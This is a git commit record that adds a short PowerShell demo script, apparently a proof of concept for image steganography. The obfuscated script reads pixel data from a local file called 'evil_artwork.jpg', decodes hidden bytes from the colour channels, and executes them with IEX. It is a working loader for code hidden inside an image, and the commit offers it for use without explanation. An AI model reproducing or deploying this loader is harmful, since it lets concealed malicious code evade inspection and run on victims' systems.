0a9a7fe8aad09bb8b781ec959fb4e81a2fb06020
vkxz <52389519+vkxz@users.noreply.github.com>
2019-07-01 11:21:09 +1000

    Add files via upload

---
+++ demo/rundemo.ps1
@@ -0,0 +1,3 @@
+﻿sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g=a System.Drawing.Bitmap("C:\Users\vktest\steg\demo\evil_artwork.jpg");
+$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};
+$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..784]))
